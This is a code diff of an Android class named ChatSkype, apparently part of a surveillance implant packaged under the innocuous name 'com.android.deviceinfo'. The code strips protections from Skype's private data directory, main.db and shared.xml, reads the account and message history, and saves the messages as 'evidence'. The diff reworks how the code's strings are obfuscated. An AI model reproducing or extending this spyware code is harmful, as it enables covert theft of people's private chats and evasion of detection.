@@ -17,8 +17,6 @@ import org.w3c.dom.NodeList;
 
 import android.database.Cursor;
 
-import com.android.deviceinfo.Messages;
-import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
@@ -27,6 +25,7 @@ import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
@@ -100,7 +99,7 @@ public class ChatSkype extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			// k_0=/data/data/com.skype.raider/files
-			String dbDir = Messages.getString("k_0");
+			String dbDir = M.e("/data/data/com.skype.raider/files");
 			Path.unprotect(dbDir, true);
 
 			String account = readAccount();
@@ -111,7 +110,7 @@ public class ChatSkype extends SubModuleChat {
 				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
 			}
 			// k_1=/main.db
-			String dbFile = dbDir + "/" + account + Messages.getString("k_1");
+			String dbFile = dbDir + "/" + account + M.e("/main.db");
 
 			Path.unprotect(dbDir + "/" + account, true);
 			Path.unprotect(dbFile, true);
@@ -292,8 +291,8 @@ public class ChatSkype extends SubModuleChat {
 			};
 
 			// f_a=messages
-			// Messages.getString("i_2")
-			long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);
+			// M.d("messages")
+			long newLastId = helper.traverseRecords(M.e("messages"), visitor);
 
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
@@ -330,10 +329,10 @@ public class ChatSkype extends SubModuleChat {
 	private String readAccount() throws IOException {
 
 		// k_0=/data/data/com.skype.raider/files
-		String dbDir = Messages.getString("k_0");
+		String dbDir = M.e("/data/data/com.skype.raider/files");
 
 		// k_2=/shared.xml
-		String confFile = dbDir + Messages.getString("k_2");
+		String confFile = dbDir + M.e("/shared.xml");
 
 		Path.unprotect(confFile, true);
 
